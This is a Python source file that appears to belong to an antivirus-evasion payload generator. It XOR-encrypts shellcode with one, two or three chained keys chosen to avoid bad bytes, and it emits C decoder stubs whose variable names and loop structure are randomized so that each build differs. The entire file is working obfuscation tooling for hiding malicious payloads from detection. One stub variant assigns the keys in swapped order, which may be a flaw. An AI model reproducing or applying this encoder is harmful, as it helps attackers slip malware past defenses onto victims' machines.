import os,sys
import binascii
import random,string
from time import sleep

def varname_creator():
    varname = ""
    Adam = random.randint(4,8)
    Eve = random.randint(12,16)
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(Adam,Eve)))
    return varname
     
def xor_encryption(data,key):
    flag = 0
    shellcode = ""
    keyarray=bytearray(key)
    data_array=bytearray(data)
    for b in data_array:
        if flag == len(key)-1:
            shellcode += bytearray([b^keyarray[flag] ]) 
            flag = 0
        else: 
            shellcode += bytearray([b^keyarray[flag] ])
            flag += 1
        
    return shellcode

def bad_char_inspector(data):

    bad_char_detected=False

    for i in range(0,len(data)):

        if data[i] == "\x00":
            bad_char_detected=True
        if data[i] == "\x0a":
            bad_char_detected=True
        if data[i] == "\x0d":
            bad_char_detected=True

    return bad_char_detected

def shellcode_key_inspect(newb,keysize,shellcode,i):
    index=0
    len_shell=len(shellcode)

    while((i+(index*(keysize))) < len_shell):

        shellbyte=bytearray(shellcode[i+(index*(keysize))])
        keybyte=bytearray(newb)

        res=bytearray([shellbyte[0]^keybyte[0]])

        if bad_char_inspector(str(res)):

            return True
 
        index+=1

    return False


def key_gen(shellcode):

    Valid_key=False

    New_lenght=True

    st_len=16

    byist=[chr(i) for i in range(1,256)]

    while Valid_key == False:

        Valid_key = True

        key=""

        if New_lenght==True:

            st_len=st_len*2
            keysize=random.randint(st_len,st_len*2)
            New_lenght=False

        sys.stdout.write("[Building xor-key (lenght:" + str(keysize) + "]: ")
        sys.stdout.flush()

        i=0

        while i < keysize:

            random.shuffle(byist)

            ii = 0

            FindB = False

            while (ii < 255) and ((Valid_key == True) and (FindB == False)):

                newb=byist[ii]

                if ((bad_char_inspector(newb) == False) and (shellcode_key_inspect(newb,keysize,shellcode.decode('string-escape'),i) == False)):
                    key+=newb
                    FindB = True
                    sleep(0.01)
                    sys.stdout.write("\\x" + newb.encode('hex'))
                    sys.stdout.flush()

                elif ii == 254:

                    Valid_key = False
                    print("[-] Failed , increasing key lenght ")
                    New_lenght=True
                    sleep(1)
                    ii+=1

                else:

                    ii+=1

            i+=1


 
    return key

def doublekey_gen(shellcode):

    Valid_key=False

    New_lenght=True

    st_len=16

    if len(shellcode) > 10000:

        st_len=st_len*2

    if len(shellcode) > 200000:

        st_len=st_len*2


    byist1=[chr(i) for i in range(1,256)]
    byist2=[chr(i) for i in range(1,256)]

    while Valid_key == False:

        Valid_key = True

        key1=""
        key2=""

        if New_lenght==True:

            st_len=st_len*2
            keysize=random.randint(st_len,st_len*2)
            New_lenght=False

        sys.stdout.write("[Building xor-key (lenght:" + str(keysize) + "]: ")
        sys.stdout.flush()

        i=0

        while i < keysize:

            random.shuffle(byist1)
            random.shuffle(byist2)

            ii = 0


            FindB = False

            while (ii < 255) and ((Valid_key == True) and (FindB == False)):

                ix = 0
                newb=byist1[ii]
                newb2=byist2[ix]

                if ((bad_char_inspector(newb) == False and bad_char_inspector(newb2) == False) and (shellcode_key_inspect(newb,keysize,newb2,i) == False) and (shellcode_key_inspect(xor_encryption(newb,newb2),keysize,shellcode.decode('string-escape'),i) == False)):

                    key1+=newb
                    key2+=newb2
                    FindB = True
                    sleep(0.01)
                    sys.stdout.write("\\x" + newb.encode('hex'))
                    sys.stdout.flush()

                elif ii == 254:

                    Valid_key = False
                    print("[-] Failed , increasing key lenght ")
                    New_lenght=True
                    sleep(1)
                    ii+=1

                else:

                    if bad_char_inspector(newb) == False:

                        while (ix < 254) and (FindB == False):

                            ix+=1

                            newb2=byist2[ix]

                            if (bad_char_inspector(newb2) == False) and ((shellcode_key_inspect(newb,keysize,newb2,i) == False) and (shellcode_key_inspect(xor_encryption(newb,newb2),keysize,shellcode.decode('string-escape'),i) == False)):

                                key1+=newb
                                key2+=newb2
                                FindB = True
                                sleep(0.01)
                                sys.stdout.write("\\x" + newb.encode('hex'))
                                sys.stdout.flush()
                        ii+=1

                    else:

                        ii+=1

            i+=1


 
    return (key1,key2)

def triplekey_gen(shellcode):

    Valid_key=False

    New_lenght=True

    st_len=16

    if len(shellcode) > 10000:

        st_len=st_len*2


    if len(shellcode) > 100000:

        st_len=st_len*2

    if len(shellcode) > 1000000:

        st_len=st_len*4

    byist1=[chr(i) for i in range(1,256)]
    byist2=[chr(i) for i in range(1,256)]
    byist3=[chr(i) for i in range(1,256)]

    while Valid_key == False:

        Valid_key = True

        key1=""
        key2=""
        key3=""

        if New_lenght==True:

            st_len=st_len*2
            keysize=random.randint(st_len,st_len*2)
            New_lenght=False

        sys.stdout.write("[Building xor-key (lenght:" + str(keysize) + "]: ")
        sys.stdout.flush()

        i=0

        while i < keysize:

            random.shuffle(byist1)
            random.shuffle(byist2)
            random.shuffle(byist3)

            ii = 0


            FindB = False

            while (ii < 255) and ((Valid_key == True) and (FindB == False)):

                ix = 0
                iz = 0
                newb=byist1[ii]
                newb2=byist2[ix]
                newb3=byist3[iz]

                if (bad_char_inspector(newb) == False) and (bad_char_inspector(newb2) == False and bad_char_inspector(newb3) == False) and (shellcode_key_inspect(newb,keysize,newb2,i) == False and shellcode_key_inspect(xor_encryption(newb,newb2),keysize,newb3,i) == False and shellcode_key_inspect(xor_encryption(xor_encryption(newb,newb2),newb3),keysize,shellcode.decode('string-escape'),i) == False):

                    key1+=newb
                    key2+=newb2
                    key3+=newb3
                    FindB = True
                    sleep(0.01)
                    sys.stdout.write("\\x" + newb.encode('hex'))
                    sys.stdout.flush()

                elif ii == 254:

                    Valid_key = False
                    print("[-] Failed , increasing key lenght ")
                    New_lenght=True
                    sleep(1)
                    ii+=1

                else:

                    if bad_char_inspector(newb) == False:

                        while (ix < 254) and (FindB == False):

                            ix+=1
                            iz=0

                            newb2=byist2[ix]

                            while (iz < 254) and (FindB == False):

                                if (bad_char_inspector(newb2) == False) and (bad_char_inspector(newb3) == False) and (shellcode_key_inspect(newb,keysize,newb2,i) == False and shellcode_key_inspect(xor_encryption(newb,newb2),keysize,newb3,i) == False and shellcode_key_inspect(xor_encryption(xor_encryption(newb,newb2),newb3),keysize,shellcode.decode('string-escape'),i) == False):

                                    key1+=newb
                                    key2+=newb2
                                    key3+=newb3
                                    FindB = True
                                    sleep(0.01)
                                    sys.stdout.write("\\x" + newb.encode('hex'))
                                    sys.stdout.flush()

                                else:
                                    newb3=byist3[iz]

                                iz+=1
                            ii+=1
                        ii+=1

                    else:

                        ii+=1

            i+=1


 
    return (key1,key2,key3)


def Xor_stub2(shellcode,bufname):

    key=key_gen(shellcode)

    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),key)
    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key = binascii.hexlify(key)
    printable_key = ""
    for i in range(0,len(key)-1,2):
        
        printable_key += "\\x" + key[i] + key[i+1]

    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    keyname = varname_creator()

    Encoded_buffer = "unsigned char " + bufname + "[] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:


        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 2:


        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 3:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"

    if StubSelect == 4:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"

    print("")
    return (Encoded_buffer,Xor_stub)

def Doublexor_stub2(shellcode,bufname):
    keys=doublekey_gen(shellcode)
    key1=keys[0]
    key2=keys[1]
    Realkey=xor_encryption(key1,key2)
    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key1 = binascii.hexlify(key1)
    printable_key1 = ""
    for i in range(0,len(key1)-1,2):
        
        printable_key1 += "\\x" + key1[i] + key1[i+1]

    key2 = binascii.hexlify(key2)
    printable_key2 = ""
    for i in range(0,len(key2)-1,2):
        
        printable_key2 += "\\x" + key2[i] + key2[i+1]


    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    Randflag4 = varname_creator()
    keyname1 = varname_creator()
    keyname2 = varname_creator()
    keynamestep1 = varname_creator()
    keynamestep2 = varname_creator()


    Encoded_buffer = "unsigned char " + bufname + "[] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"   

    if StubSelect == 4:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"    

    print("")    
    return (Encoded_buffer,Xor_stub)

def Triplexor_stub2(shellcode,bufname):
    keys=triplekey_gen(shellcode)
    key1=keys[0]
    key2=keys[1]
    key3=keys[2]
    Realkey=xor_encryption(key1,key2)
    Realkey=xor_encryption(Realkey,key3)
    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),Realkey)
    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key1 = binascii.hexlify(key1)
    printable_key1 = ""
    for i in range(0,len(key1)-1,2):
        
        printable_key1 += "\\x" + key1[i] + key1[i+1]

    key2 = binascii.hexlify(key2)
    printable_key2 = ""
    for i in range(0,len(key2)-1,2):
        
        printable_key2 += "\\x" + key2[i] + key2[i+1]

    key3 = binascii.hexlify(key3)
    printable_key3 = ""
    for i in range(0,len(key3)-1,2):
        
        printable_key3 += "\\x" + key3[i] + key3[i+1]


    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    Randflag3 = varname_creator()
    Randflag4 = varname_creator()
    keyname1 = varname_creator()
    keyname2 = varname_creator()
    keyname3 = varname_creator()
    keynamestep1 = varname_creator()
    keynamestep2 = varname_creator()

    Encoded_buffer = "unsigned char " + bufname + "[] = \"" + printable_shellcode + "\";\n"

    Xor_stub = ""

    StubSelect=random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + keyname1 + "); " + Randflag1 +"++){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"

    if StubSelect == 4:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag3 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + printable_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + printable_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname3 + " [] = \"" + printable_key3 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "unsigned char " + keynamestep2 + " [strlen(" + keyname1 + ")];\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname2 + ")-1){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + keyname1 + ")){\n"
        Xor_stub += keynamestep2 + "[" + Randflag1 + "]  = " + keynamestep1 + "[" + Randflag1 + "]^" + keyname3 + "[" + Randflag3 + "];\n"
        Xor_stub += "if(" + Randflag3 + " == strlen(" + keyname3 + ")-1){\n"
        Xor_stub += Randflag3 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag3  + " = " + Randflag3 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < strlen(" + bufname + ")){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep2 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == strlen(" + keyname1 + ")-1){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"

 
    print("")    
    return (Encoded_buffer,Xor_stub)
